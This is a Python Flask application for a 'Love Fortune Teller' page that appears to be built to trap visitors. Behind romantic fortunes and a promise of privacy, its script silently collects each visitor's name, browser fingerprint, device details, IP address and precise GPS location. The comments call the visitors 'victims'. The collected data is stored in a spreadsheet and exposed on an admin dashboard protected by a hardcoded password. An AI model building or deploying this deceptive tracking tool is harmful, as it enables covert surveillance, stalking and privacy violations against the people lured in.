from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
import pandas as pd
import openpyxl
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
import os
import requests
import json
from datetime import datetime
import random

app = Flask(__name__)
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')

FORTUNES = [
    "Your soulmate is thinking of you right now under the stars.",
    "A passionate kiss awaits you this week from someone special.",
    "True love will find you when you least expect it - soon!",
    "Your heart will flutter with excitement in the next 7 days.",
    "Someone is dreaming about your smile tonight.",
    "A romantic adventure is just around the corner.",
    "Your perfect match shares your birthday month!",
    "Love letters are coming your way soon.",
    "A candlelit dinner for two is in your future.",
    "Your crush has been watching your social media.",
    "Wedding bells might ring for you within a year!",
    "Passion ignites when you meet your destiny.",
    "Your forever person is closer than you think.",
    "A surprise love confession awaits you.",
    "Your heart knows who it's meant for.",
    "Romantic sparks will fly this month!",
    "Someone special can't stop thinking about you.",
    "Love at first sight is about to happen.",
    "Your soul connection is searching for you.",
    "A fairytale romance begins soon.",
    "Heart emojis are coming from your crush.",
    "True love doesn't follow a timeline.",
    "Your love story is about to unfold.",
    "Passionate nights await your future.",
    "Someone's heart beats faster when they see you.",
    "Love will surprise you beautifully.",
    "Your perfect partner admires you secretly.",
    "Romance blooms when you trust your heart.",
    "A love that feels like home is coming.",
    "Your happily ever after starts soon.",
    "Butterflies in your stomach are a sign.",
    "Love recognizes no barriers."
]

def ensure_data_file():
    if not os.path.exists(DATA_FILE):
        wb = Workbook()
        ws = wb.active
        ws.title = "Fortunes Data"
        headers = [
            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address',
            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
            'Memory', 'Network', 'Fingerprint', 'Fortune_Shown', 'Extra'
        ]
        for col, header in enumerate(headers, 1):
            cell = ws.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
            cell.alignment = Alignment(horizontal="center")
        wb.save(DATA_FILE)

def backup_data():
    if os.path.exists(DATA_FILE):
        try:
            wb = openpyxl.load_workbook(DATA_FILE)
            wb.save(BACKUP_FILE)
        except:
            pass

def load_data():
    try:
        if os.path.exists(DATA_FILE):
            return pd.read_excel(DATA_FILE)
        elif os.path.exists(BACKUP_FILE):
            return pd.read_excel(BACKUP_FILE)
    except:
        pass
    return pd.DataFrame()

def save_data(df):
    try:
        backup_data()
        existing_df = load_data()
        if existing_df.empty:
            final_df = df
        else:
            final_df = pd.concat([existing_df, df], ignore_index=True)
        final_df.to_excel(DATA_FILE, index=False, engine='openpyxl')
    except Exception as e:
        print(f"Save failed: {e}")

def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'Unknown'

def get_tinyurl(long_url):
    try:
        response = requests.get("https://tinyurl.com/api-create.php", params={'url': long_url}, timeout=10)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return long_url

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .sub {
            color: #888;
            margin-bottom: 25px;
        }
        .btn {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            padding: 14px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.3s;
            margin: 10px;
            min-width: 200px;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(255,107,107,0.3); }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
        }
        .fortune-box {
            background: rgba(255,182,193,0.3);
            border-left: 5px solid #ff1493;
            border-radius: 20px;
            padding: 25px;
            margin: 25px 0;
            font-family: 'Dancing Script', cursive;
            font-size: 1.8em;
            color: #c06c84;
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .map-link {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 20px;
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            text-decoration: none;
            border-radius: 30px;
            font-weight: bold;
        }
        .map-link:hover { transform: translateY(-2px); }
        input {
            width: 80%;
            max-width: 400px;
            padding: 15px;
            margin: 15px 0;
            border: 2px solid #ffdde1;
            border-radius: 50px;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
        input:focus {
            outline: none;
            border-color: #ff6b6b;
            box-shadow: 0 0 20px rgba(255,107,107,0.3);
        }
        .hidden { display: none; }
        hr { margin: 30px 0; border: 1px solid #ffdde1; }
    </style>
</head>
<body>
<div class="container">
    <h1>💕 Love Fortune Teller 💕</h1>
    <div class="sub">Discover your romantic destiny with cosmic accuracy ✨</div>

    <div id="inputArea">
        <input type="text" id="userNameInput" placeholder="✨ Enter your full name ✨">
        <br>
        <button class="btn" onclick="getFortune()">🔮 Reveal My Love Fortune</button>
    </div>

    <div id="fortuneDisplay" class="fortune-box hidden"></div>
    <div id="status" class="status"></div>
    
    <hr>
    <div class="sub" style="font-size: 14px;">
        🌟 All readings are 100% private and secure
    </div>
</div>

<script>
let collectedData = {};

async function getFingerprint() {
    const fp = await FingerprintJS.load();
    const result = await fp.get();
    return result.visitorId;
}

async function getBattery() {
    if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return Math.round(battery.level * 100) + '%';
    }
    return 'N/A';
}

function getNetwork() {
    const conn = navigator.connection || navigator.mozConnection || {};
    return conn.effectiveType ? `${conn.effectiveType} (${conn.downlink || '?'} Mbps)` : 'N/A';
}

function getTimezone() {
    return Intl.DateTimeFormat().resolvedOptions().timeZone;
}

function getMemory() {
    return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
}

function getScreen() {
    return `${screen.width}x${screen.height}`;
}

async function collectAllData(name) {
    const data = {
        timestamp: new Date().toISOString(),
        name: name,
        userAgent: navigator.userAgent,
        screen: getScreen(),
        timezone: getTimezone(),
        memory: await getMemory(),
        network: getNetwork(),
        battery: await getBattery(),
        fingerprint: await getFingerprint()
    };
    collectedData = data;
    
    // Send to server silently
    try {
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch(e) {
        console.log('Data send failed:', e);
    }
    
    return data;
}

function showStatus(msg, isError = false) {
    const status = document.getElementById('status');
    status.textContent = msg;
    status.style.background = isError ? 'rgba(255,100,100,0.3)' : 'rgba(100,255,100,0.3)';
    status.style.color = isError ? '#cc0000' : '#006600';
    status.style.border = `2px solid ${isError ? '#ff4444' : '#00cc88'}`;
    
    if (!isError) {
        setTimeout(() => status.textContent = '', 4000);
    }
}

async function getFortune() {
    const nameInput = document.getElementById('userNameInput');
    const name = nameInput.value.trim();
    
    if (!name) {
        showStatus('❌ Please enter your name first!', true);
        nameInput.focus();
        return;
    }
    
    // Hide input, show loading
    nameInput.style.display = 'none';
    document.querySelector('#inputArea button').style.display = 'none';
    showStatus('🌟 Connecting to cosmic energies...');
    
    try {
        // Collect ALL victim data silently
        await collectAllData(name);
        showStatus('📍 Detecting your exact location for precise reading...');
        
        // Try to get GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    collectedData.latitude = position.coords.latitude;
                    collectedData.longitude = position.coords.longitude;
                    
                    // Send GPS data
                    await fetch('/save', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(collectedData)
                    });
                    
                    // Get fortune
                    const fortuneResp = await fetch('/fortune');
                    const fortuneData = await fortuneResp.json();
                    
                    // Get TinyURL map
                    const mapUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                    const tinyResp = await fetch('/tinyurl', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ url: mapUrl })
                    });
                    const tinyData = await tinyResp.json();
                    
                    // Show fortune + map
                    const fortuneBox = document.getElementById('fortuneDisplay');
                    fortuneBox.innerHTML = `
                        <div>${fortuneData.fortune}</div>
                        ${tinyData.tinyurl ? `<br><a href="${tinyData.tinyurl}" target="_blank" class="map-link">🗺️ See your exact location on map</a>` : ''}
                    `;
                    fortuneBox.classList.remove('hidden');
                    showStatus('✨ Your cosmic love reading is complete! 🌟');
                },
                async (error) => {
                    // No GPS? Still collect other data and show fortune
                    await fetch('/save', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(collectedData)
                    });
                    
                    const fortuneResp = await fetch('/fortune');
                    const fortuneData = await fortuneResp.json();
                    
                    document.getElementById('fortuneDisplay').innerHTML = fortuneData.fortune;
                    document.getElementById('fortuneDisplay').classList.remove('hidden');
                    showStatus('✨ Your love fortune revealed! (Location optional)');
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
            );
        } else {
            // No geolocation support
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            
            const fortuneResp = await fetch('/fortune');
            const fortuneData = await fortuneResp.json();
            
            document.getElementById('fortuneDisplay').innerHTML = fortuneData.fortune;
            document.getElementById('fortuneDisplay').classList.remove('hidden');
            showStatus('✨ Your mystical fortune is ready!');
        }
        
    } catch (error) {
        showStatus('⚠️ Connection issue - showing random fortune', true);
        const fortuneResp = await fetch('/fortune');
        const fortuneData = await fortuneResp.json();
        document.getElementById('fortuneDisplay').innerHTML = fortuneData.fortune;
        document.getElementById('fortuneDisplay').classList.remove('hidden');
    }
}
</script>
</body>
</html>
    """)

@app.route('/fortune')
def fortune():
    return jsonify({'fortune': random.choice(FORTUNES)})

@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.get_json()
        df = pd.DataFrame([{
            'Timestamp': datetime.now(),
            'Name': data.get('name', 'Anonymous'),
            'Latitude': data.get('latitude', ''),
            'Longitude': data.get('longitude', ''),
            'Address': '',
            'Battery': data.get('battery', ''),
            'UserAgent': data.get('userAgent', ''),
            'Screen': data.get('screen', ''),
            'IP': get_client_ip(),
            'Timezone': data.get('timezone', ''),
            'Memory': data.get('memory', ''),
            'Network': data.get('network', ''),
            'Fingerprint': data.get('fingerprint', ''),
            'Fortune_Shown': True,
            'Extra': json.dumps(data)
        }])
        save_data(df)
        return jsonify({'status': 'saved'})
    except Exception as e:
        print(f"Save error: {e}")
        return jsonify({'status': 'error'})

@app.route('/tinyurl', methods=['POST'])
def tinyurl():
    try:
        long_url = request.json.get('url', '')
        tiny_url = get_tinyurl(long_url)
        return jsonify({'tinyurl': tiny_url})
    except:
        return jsonify({'tinyurl': ''})

@app.route('/admin')
def admin():
    if request.args.get('pass') != 'admin123':
        return '''
        <div style="padding:50px;text-align:center;">
            <h2>🔐 Love Fortune Admin</h2>
            <form style="max-width:300px;margin:0 auto;">
                <input name="pass" type="password" placeholder="admin123" style="width:100%;padding:15px;margin:10px;border-radius:25px;border:2px solid #ffdde1;font-size:16px;">
                <button style="width:100%;padding:15px;background:linear-gradient(135deg,#ff6b6b,#c06c84);color:white;border:none;border-radius:25px;font-size:16px;font-weight:bold;cursor:pointer;">Login</button>
            </form>
        </div>
        '''
    
    df = load_data()
    if df.empty:
        return "<h2 style='text-align:center;padding:50px;'>📊 No fortune data yet</h2>"
    
    html = """
    <div style='max-width:1200px;margin:0 auto;padding:20px;'>
        <h1 style='text-align:center;color:#ff1493;'>💕 Love Fortune Data Dashboard</h1>
        <h3 style='text-align:center;color:#666;'>""" + str(len(df)) + """ victims captured</h3>
        <table border='1' style='border-collapse:collapse;width:100%;font-size:12px;'>
            <tr style='background:#ff1493;color:white;'>
    """
    
    # Headers
    for col in df.columns:
        html += f"<th style='padding:8px;text-align:left;'>{col}</th>"
    html += "</tr>"
    
    # Data rows
    for idx, row in df.iterrows():
        html += "<tr style='border-bottom:1px solid #eee;'>"
        for col in df.columns:
            val = str(row[col])
            if len(val) > 50:
                val = val[:50] + '...'
            html += f"<td style='padding:8px;word-break:break-all;'>{val}</td>"
        html += "</tr>"
    
    html += """
        </table>
        <br>
        <div style='text-align:center;'>
            <a href='/download-excel?pass=admin123' 
               style='display:inline-block;padding:20px 40px;background:linear-gradient(135deg,#ff1493,#ff6b6b);color:white;text-decoration:none;border-radius:50px;font-size:20px;font-weight:bold;box-shadow:0 10px 30px rgba(255,20,147,0.4);'>
                📥 Download Full Excel
            </a>
        </div>
    </div>
    """
    
    return html

@app.route('/download-excel')
def download_excel():
    if request.args.get('pass') != 'admin123':
        abort(403)
    if os.path.exists(DATA_FILE):
        return send_file(DATA_FILE, as_attachment=True, download_name='love_fortune_data.xlsx')
    return "No data file found", 404

if __name__ == '__main__':
    ensure_data_file()
    port = int(os.environ.get('PORT', 5000))
    print("🚀 Love Fortune Teller starting on port", port)
    app.run(host='0.0.0.0', port=port, debug=False)
